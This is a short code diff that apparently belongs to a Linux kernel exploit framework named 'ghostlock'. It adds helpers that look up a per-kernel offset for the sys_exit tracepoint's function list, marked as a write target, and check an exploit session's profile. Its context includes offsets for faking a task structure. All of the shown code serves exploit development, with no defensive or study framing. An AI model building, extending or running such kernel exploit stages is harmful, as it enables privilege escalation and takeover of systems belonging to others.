@@ -102,6 +102,20 @@ namespace ghostlock::profile {
             ghostlock::kernel::SLIDE_SYSCTL_BOOTID_OFF);
     }
 
+    /* W1c target: __tracepoint_sys_exit->funcs. No compile-time fallback —
+     * the offset is kernel-specific (data symbol, disassembly-derived), so a
+     * missing profile field must disable the stage, not guess. */
+    inline uintptr_t sys_exit_tp_funcs_image() {
+        return symbol_image(
+            [](const kernel_offsets &v) { return v.offsets.sys_exit_tp_funcs; }, 0);
+    }
+
+    inline bool sys_exit_tp_funcs_present() {
+        const kernel_offsets *values =
+            ghostlock::session::g_exploit_session.profile.values();
+        return values && values->offsets.sys_exit_tp_funcs != 0;
+    }
+
     inline uint32_t fake_task_prio_off() {
         return symbol_u32([](const kernel_offsets &v) { return v.task.prio; }, 0x94);
     }
